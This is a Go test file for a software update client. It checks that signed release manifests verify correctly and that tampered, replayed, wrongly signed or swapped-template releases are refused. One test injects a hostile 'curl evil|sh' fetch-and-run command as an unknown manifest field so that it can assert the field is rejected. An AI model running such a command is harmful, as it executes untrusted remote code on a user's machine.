package update

import (
	"context"
	"crypto/ed25519"
	"crypto/rand"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"
)

func release(t *testing.T, key ed25519.PrivateKey, version string, tmpl []byte) (manifest, sig []byte) {
	t.Helper()
	m := Manifest{Version: version, PublishedAt: time.Date(2026, 10, 20, 0, 0, 0, 0, time.UTC), Template: RuntimeHash(tmpl), TemplateSize: int64(len(tmpl)), Runtime: RuntimeHash([]byte("FROM x"))}
	manifest, _ = json.Marshal(m)
	return manifest, Sign(manifest, key)
}

func TestVerify(t *testing.T) {
	pub, priv, _ := ed25519.GenerateKey(rand.Reader)
	_, other, _ := ed25519.GenerateKey(rand.Reader)
	manifest, sig := release(t, priv, "2026.10.20", []byte("tmpl"))
	if m, err := Verify(manifest, sig, []ed25519.PublicKey{pub}); err != nil || m.Version != "2026.10.20" {
		t.Fatalf("good release: %v", err)
	}
	if _, err := Verify(manifest, Sign(manifest, other), []ed25519.PublicKey{pub}); err != ErrBadSignature {
		t.Fatal("a release signed by another key must be refused")
	}
	tampered := []byte(strings.Replace(string(manifest), "2026.10.20", "2026.10.21", 1))
	if _, err := Verify(tampered, sig, []ed25519.PublicKey{pub}); err != ErrBadSignature {
		t.Fatal("a changed manifest must be refused")
	}
	if _, err := Verify(manifest, []byte("garbage"), []ed25519.PublicKey{pub}); err != ErrBadSignature {
		t.Fatal("garbage signature")
	}
	extra := []byte(strings.Replace(string(manifest), "{", `{"run":"curl evil|sh",`, 1))
	if _, err := Verify(extra, Sign(extra, priv), []ed25519.PublicKey{pub}); err == nil {
		t.Fatal("unknown manifest fields are refused")
	}
}

func TestNewer(t *testing.T) {
	m := &Manifest{Version: "2026.10.20", PublishedAt: time.Date(2026, 10, 20, 0, 0, 0, 0, time.UTC)}
	if !Newer(m, "2026.10.08-035c504+", time.Time{}) {
		t.Fatal("a development kernel takes the latest release")
	}
	if Newer(m, "2026.10.20", time.Time{}) {
		t.Fatal("same version: nothing to do")
	}
	if Newer(m, "2026.10.25", time.Date(2026, 10, 25, 0, 0, 0, 0, time.UTC)) {
		t.Fatal("an older (replayed) release must not replace a newer one")
	}
}

func TestClientChecksTheTemplate(t *testing.T) {
	pub, priv, _ := ed25519.GenerateKey(rand.Reader)
	tmpl := []byte("the template")
	manifest, sig := release(t, priv, "2026.10.20", tmpl)
	serve := tmpl
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/manifest.json":
			w.Write(manifest)
		case "/manifest.json.sig":
			w.Write(sig)
		case "/template.tar.gz":
			w.Write(serve)
		default:
			http.NotFound(w, r)
		}
	}))
	defer srv.Close()
	c := &Client{Source: srv.URL, Keys: []ed25519.PublicKey{pub}}
	m, err := c.Latest(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	if b, err := c.Template(context.Background(), m); err != nil || string(b) != "the template" {
		t.Fatalf("template: %v", err)
	}
	serve = []byte("swapped template")
	if _, err := c.Template(context.Background(), m); err == nil {
		t.Fatal("a template that isn't the signed one must be refused")
	}
}

func TestTrustedKeysLoad(t *testing.T) {
	if len(TrustedKeys) == 0 {
		t.Fatal("no trusted release keys")
	}
}
